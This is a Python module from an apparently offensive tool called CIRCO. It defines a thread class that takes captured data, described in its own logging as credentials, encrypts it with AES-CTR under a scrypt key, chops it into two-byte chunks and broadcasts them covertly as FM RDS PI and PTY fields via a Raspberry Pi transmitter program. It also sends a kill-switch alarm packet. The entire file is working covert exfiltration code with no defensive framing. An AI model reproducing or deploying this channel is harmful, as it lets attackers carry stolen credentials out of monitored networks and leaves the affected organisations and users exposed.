import threading
import subprocess
import time
import os
import signal
import pyaes
import pyscrypt
import logging

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilFM(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.magic = conf['MAGIC']
        self.fm = conf['FM']
        self.pktnum = 1
        self.block = 0
        self.pi_fm = conf['DIRNAME'] + '/tools/pi_fm_adv'
        self.wavfile = conf['DIRNAME'] + '/tools/rds.wav'

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt data
                    cry = self.encrypt(data).upper()
                    # encrypt and split into 16 bits (2 bytes)
                    ar = [cry[i:i+4] for i in range(0, len(cry), 4)]
                    if len(cry) % 4 != 0:
                        for x in range(4-len(ar[len(ar)-1])):
                            ar[len(ar)-1] = ar[len(ar)-1] + '0'

                    # FM exfiltration
                    logging.debug('Sending credentials via FM {}'.format(self.fm))

                    with open(os.devnull, 'w') as fdnull:
                        # First packet: PI = crypto_len, PTY = 1 (News)
                        proc = subprocess.Popen([self.pi_fm,
                                                '--audio', self.wavfile,
                                                '--rds', '1',
                                                '--rt', '',
                                                '--ps', 'CIRCO',
                                                '--pty', '31',
                                                '--pi', str(len(cry))],
                                                 stdout=fdnull, stderr=subprocess.STDOUT)
                        time.sleep(3)
                        proc.send_signal(signal.SIGINT)

                        # Second packet + N: PTY = pkt num (1-30), PI = crypto chuck (AAAA-FFFF), PTY != 31 (Alarm)
                        for chunk in ar:
                            if self.pktnum >= 30:
                                # send ADD more
                                proc = subprocess.Popen([self.pi_fm,
                                                        '--audio', self.wavfile,
                                                        '--rds', '1',
                                                        '--rt', '',
                                                        '--ps', 'CIRCO',
                                                        '--pty', str(self.pktnum),
                                                        '--pi', chunk],
                                                        stdout=fdnull, stderr=subprocess.STDOUT)
                                time.sleep(3)
                                proc.send_signal(signal.SIGINT)
                                proc = subprocess.Popen([self.pi_fm,
                                                        '--audio', self.wavfile,
                                                        '--rds', '1',
                                                        '--rt', '',
                                                        '--ps', 'CIRCO',
                                                        '--pty', '0',
                                                        '--pi', '0000'],
                                                        stdout=fdnull, stderr=subprocess.STDOUT)
                                time.sleep(3)
                                proc.send_signal(signal.SIGINT)
                                self.pktnum = 1
                            else:
                                proc = subprocess.Popen([self.pi_fm,
                                                        '--audio', self.wavfile,
                                                        '--rds', '1',
                                                        '--rt', '',
                                                        '--ps', 'CIRCO',
                                                        '--pty', str(self.pktnum),
                                                        '--pi', chunk],
                                                        stdout=fdnull, stderr=subprocess.STDOUT)
                                time.sleep(3)
                                proc.send_signal(signal.SIGINT)
                                self.pktnum += 1
                        self.pktnum = 1
                        self.block = 0


    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        with open(os.devnull, 'w') as fdnull:
            proc = subprocess.Popen([self.pi_fm,
                                    '--audio', self.wavfile,
                                    '--rds', '1',
                                    '--rt', '',
                                    '--ps', 'CIRCO',
                                    '--pty', '31',
                                    '--pi', self.magic],
                                     stdout=fdnull, stderr=subprocess.STDOUT)
            time.sleep(3)
            proc.send_signal(signal.SIGINT)

    # Stop Function
    def join(self):
        self.stoprequest.set()
